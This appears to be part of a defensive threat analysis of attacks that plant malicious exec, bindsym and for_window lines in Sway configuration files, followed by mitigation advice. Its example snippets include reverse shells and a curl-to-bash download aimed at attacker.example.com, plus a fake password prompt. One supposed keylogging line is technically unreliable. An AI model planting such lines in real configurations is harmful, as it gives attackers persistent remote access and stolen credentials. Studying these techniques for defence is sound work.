### 4. Deep Analysis of Attack Tree Path: 2.1.1. Modify Sway Configuration to Execute Malicious Commands on Startup/Events [HIGH RISK PATH]

This attack path focuses on exploiting the flexibility of Sway's configuration file to inject and execute malicious commands. Sway, like many window managers, relies on a configuration file (`config` usually located in `~/.config/sway/config` or `/etc/sway/config`) to customize its behavior. This configuration file is parsed and executed by Sway upon startup and in response to various events. If an attacker can modify this file, they can gain significant control over the user's session.

#### 4.1. Attack Vectors Breakdown:

##### 4.1.1. Adding `exec` directives in the Sway configuration file to execute malicious scripts or binaries when Sway starts.

*   **Technical Details:** The `exec` directive in Sway configuration is designed to execute commands when Sway starts.  This is a legitimate feature used for launching applications, setting environment variables, and performing other startup tasks.  However, if an attacker can modify the configuration file, they can insert their own `exec` directives to run arbitrary commands with the user's privileges when Sway starts.

*   **Example Malicious Configuration Snippet:**

    ```sway
    # Legitimate exec command (example)
    exec nm-applet

    # Malicious exec command - Reverse shell to attacker's server
    exec bash -c 'bash -i >& /dev/tcp/attacker.example.com/4444 0>&1'

    # Malicious exec command - Display a fake login prompt and log credentials
    exec bash -c 'zenity --password --title="System Update" --text="Enter your password to continue:" > /tmp/creds.txt'

    # Malicious exec command - Download and execute a script
    exec bash -c 'curl http://attacker.example.com/malicious_script.sh | bash'
    ```

*   **Potential Impact:**
    *   **Full User Privilege Execution:** Commands executed via `exec` run with the same privileges as the user running Sway. This typically means full user access to files, processes, and network resources.
    *   **Persistence:** Malicious commands are executed every time Sway starts, providing persistence across reboots or Sway restarts.
    *   **Wide Range of Malicious Actions:** Attackers can perform a wide range of actions, including:
        *   **Establishing Reverse Shells:** Gaining remote access to the compromised system.
        *   **Data Exfiltration:** Stealing sensitive data from the user's files or applications.
        *   **Credential Harvesting:** Capturing user credentials through fake prompts or keyloggers.
        *   **Ransomware Deployment:** Encrypting user data and demanding ransom.
        *   **Botnet Recruitment:** Enrolling the compromised system into a botnet.
        *   **System Disruption:** Causing system instability, resource exhaustion, or denial of service.

*   **Preconditions for Exploitation:**
    *   **Write Access to Sway Configuration File:** The attacker must gain write access to the Sway configuration file. This could be achieved through various means:
        *   **Compromised User Account:** If the attacker compromises the user's account through phishing, password cracking, or other methods.
        *   **Local Privilege Escalation:** If the attacker has limited access to the system, they might exploit local vulnerabilities to gain write access to the user's configuration directory.
        *   **Social Engineering:** Tricking the user into manually adding malicious lines to their configuration file.
        *   **Supply Chain Attack:** Compromising software installation or update processes to inject malicious configuration files.

##### 4.1.2. Using `bindsym` or `for_window` directives in the configuration to trigger malicious commands in response to specific user actions or window events.

*   **Technical Details:**
    *   **`bindsym`:**  This directive binds a command to a specific key combination. When the user presses the defined key combination, the associated command is executed.
    *   **`for_window`:** This directive applies commands to windows matching certain criteria (e.g., class, title). It can be used with `exec` to execute commands when a window matching the criteria is created or focused.

    Attackers can misuse these directives to trigger malicious commands based on user interactions or window events, making the attack less obvious than startup commands.

*   **Example Malicious Configuration Snippet:**

    ```sway
    # Malicious bindsym - Execute reverse shell on pressing Super+Shift+R
    bindsym Mod4+Shift+r exec bash -c 'bash -i >& /dev/tcp/attacker.example.com/4444 0>&1'

    # Malicious for_window - Execute script when Firefox window is focused
    for_window [class="firefox"] exec /path/to/malicious_script.sh

    # Malicious bindsym - Display fake error message and log keystrokes when Ctrl+Alt+E is pressed
    bindsym Control+Mod1+e exec bash -c 'zenity --error --text="System Error! Please contact administrator." && xinput --query-state :0 | grep -oP "valuator\[\d+\]=\K\d+" >> /tmp/keystrokes.log'
    ```

*   **Potential Impact:**
    *   **User-Triggered Execution:** Malicious commands are executed when the user performs specific actions (key presses) or when certain window events occur. This can make the attack less immediately noticeable at startup.
    *   **Stealth and Deception:** Attackers can choose triggers that are less likely to be accidentally activated, making the malicious behavior more stealthy. They can also use deceptive commands (like fake error messages) to mask malicious activity.
    *   **Similar Malicious Actions as `exec`:** The range of malicious actions is similar to those achievable with `exec` directives, including remote access, data theft, and system disruption.

*   **Preconditions for Exploitation:**
    *   **Write Access to Sway Configuration File:**  Same as with `exec` directives, the attacker needs write access to the Sway configuration file.
    *   **User Interaction (for `bindsym`):** For `bindsym` attacks, the user needs to press the configured key combination for the malicious command to execute.
    *   **Window Event Trigger (for `for_window`):** For `for_window` attacks, the targeted window event (e.g., window creation, focus) needs to occur.

##### 4.1.3. Modifying configuration settings related to input devices or window management to execute commands when certain input events are received or windows are created/destroyed.

*   **Technical Details:** Sway's configuration allows for fine-grained control over input devices and window management. While less direct than `exec`, attackers might be able to leverage these settings indirectly to trigger command execution. This could involve:
    *   **Input Device Configuration Manipulation:**  While less common for direct command execution, manipulating input device settings *could* potentially be combined with scripts that monitor input events and trigger actions based on unusual patterns (though this is more complex and less direct).
    *   **Window Management Rules Abuse:**  Extensive use of `for_window` with complex criteria could be considered a form of manipulating window management settings.  The previous section already covers `for_window` effectively.  It's less likely that *other* window management settings would directly lead to command execution in the same straightforward way as `exec`, `bindsym`, or `for_window`.

*   **Example (Less Direct, More Hypothetical):**  It's harder to give a direct, simple example for *input device* manipulation leading to command execution via configuration alone.  It's more likely that this vector would involve a combination of configuration changes and external scripts monitoring input events.

    For instance, an attacker *might* try to use `input` sections to trigger scripts based on device events, but this is significantly more complex and less reliable than using `bindsym` or `for_window`.

    ```sway
    # Hypothetical and less direct - more likely to be part of a larger, more complex attack
    input "type:keyboard" {
        # ... potentially some way to trigger a script on specific key events (less direct in Sway config)
        # This is NOT a direct command execution like exec, bindsym, for_window
        # More likely to require external script monitoring input events based on config changes.
    }
    ```

*   **Potential Impact:**
    *   **Potentially Less Direct and More Complex:** This vector is generally less direct and more complex to exploit for command execution compared to `exec`, `bindsym`, and `for_window`.
    *   **Still Could Lead to Malicious Actions:** If combined with external scripts or more sophisticated configuration manipulations, it *could* potentially be used to trigger malicious actions based on input events or window management events.

*   **Preconditions for Exploitation:**
    *   **Write Access to Sway Configuration File:**  Still requires write access to the configuration file.
    *   **More Complex Exploitation:** Exploiting this vector is likely to be more complex and require a deeper understanding of Sway's input and window management systems, potentially involving external scripts or more intricate configuration manipulations.

#### 4.2. Overall Risk Assessment for Attack Path 2.1.1:

*   **Likelihood:**  **Medium to High**. The likelihood depends heavily on the overall security posture of the system and user practices. If an attacker can gain access to the user's account or exploit local vulnerabilities, modifying the Sway configuration file is a relatively straightforward step. Social engineering could also be used to trick users into making malicious configuration changes.
*   **Severity:** **High**. Successful exploitation of this attack path can lead to complete compromise of the user's session, allowing the attacker to execute arbitrary commands with user privileges. This can result in severe consequences, including data breaches, system disruption, and loss of control.
*   **Overall Risk Level:** **HIGH**.  Due to the high potential severity and a medium to high likelihood of exploitation (depending on system security), this attack path is considered a **HIGH RISK**.

### 5. Mitigation Strategies

To mitigate the risk associated with modifying Sway configuration files for malicious command execution, the following strategies are recommended:

#### 5.1. Preventative Measures:

*   **Secure User Accounts:**
    *   **Strong Passwords:** Enforce strong password policies and encourage users to use password managers.
    *   **Multi-Factor Authentication (MFA):** Implement MFA for user accounts to add an extra layer of security against account compromise.
    *   **Principle of Least Privilege:**  Limit user privileges to only what is necessary. Avoid running Sway as root (which is generally not recommended anyway).

*   **File System Permissions:**
    *   **Restrict Write Access to Configuration Files:** Ensure that only the user and root (for system-wide configurations) have write access to the Sway configuration directory (`~/.config/sway/` and `/etc/sway/`). Verify correct permissions are set on the `config` file itself (e.g., `644` or `600` for user-owned config).
    *   **Regularly Audit File Permissions:** Periodically audit file permissions on configuration files and directories to ensure they haven't been inadvertently or maliciously changed.

*   **Configuration File Integrity Monitoring:**
    *   **File Integrity Monitoring (FIM) Systems:** Implement FIM tools (like `AIDE`, `Tripwire`, or `osquery`) to monitor changes to the Sway configuration file.  Alerts should be generated when unauthorized modifications are detected.
    *   **Version Control for Configuration:** Encourage users (especially in managed environments) to use version control (like Git) to track changes to their Sway configuration. This allows for easy rollback to previous known-good configurations and helps in identifying unauthorized modifications.

*   **Input Validation and Sanitization (within Sway - Development Team Action):**
    *   **While Sway configuration is designed for user customization, consider if there are any areas where input validation or sanitization could be applied to `exec`, `bindsym`, and `for_window` commands to limit potential abuse.**  This is a complex area as it could restrict legitimate use cases, but it's worth exploring if there are any obvious dangerous patterns that could be detected and blocked (e.g., blocking execution of commands from world-writable directories, or commands containing certain suspicious keywords). **(This is a more complex and potentially controversial mitigation and needs careful consideration by the development team).**

#### 5.2. Detective Measures:

*   **System Logging and Monitoring:**
    *   **Audit Logging:** Enable system audit logging to record events related to file access and modification, process execution, and user logins. Analyze logs for suspicious activity related to Sway configuration files or command executions.
    *   **Process Monitoring:** Monitor running processes for unexpected or unauthorized commands being executed, especially those originating from Sway or user sessions.
    *   **Network Monitoring:** Monitor network traffic for unusual outbound connections originating from user sessions, which could indicate reverse shells or data exfiltration initiated by malicious commands.

*   **User Behavior Monitoring:**
    *   **Monitor for Unusual Configuration Changes:**  Alert users or administrators to significant or unexpected changes in Sway configuration files.
    *   **Detect Anomalous Command Execution:**  Look for patterns of command execution that deviate from normal user behavior.

#### 5.3. Responsive Measures:

*   **Incident Response Plan:** Develop an incident response plan to address potential compromises through malicious Sway configuration modifications. This plan should include steps for:
    *   **Detection and Alerting:**  Promptly detect and alert on suspicious activity.
    *   **Containment:** Isolate the affected system to prevent further spread.
    *   **Eradication:** Remove the malicious configuration and any persistent malware.
    *   **Recovery:** Restore the system to a known-good state.
    *   **Post-Incident Analysis:** Analyze the incident to identify root causes and improve security measures.

*   **Configuration Rollback:**  Provide users with easy ways to rollback to previous known-good Sway configurations (e.g., through version control or backup mechanisms).

### 6. Conclusion

The attack path "Modify Sway Configuration to Execute Malicious Commands on Startup/Events" poses a **HIGH RISK** to Sway users. The flexibility of Sway's configuration, while powerful, can be exploited by attackers to gain significant control over user sessions.

While completely preventing configuration modification is not feasible (as it's a core feature), implementing a combination of preventative, detective, and responsive measures is crucial to mitigate this risk.  Focus should be placed on securing user accounts, restricting access to configuration files, implementing file integrity monitoring, and establishing robust system logging and monitoring practices.

For the Sway development team, exploring potential input validation or sanitization for configuration commands (while carefully considering usability implications) could be a longer-term consideration to further enhance security.

By implementing these recommendations, the security posture of Sway can be significantly improved against this specific attack path, and contribute to a more secure user experience.
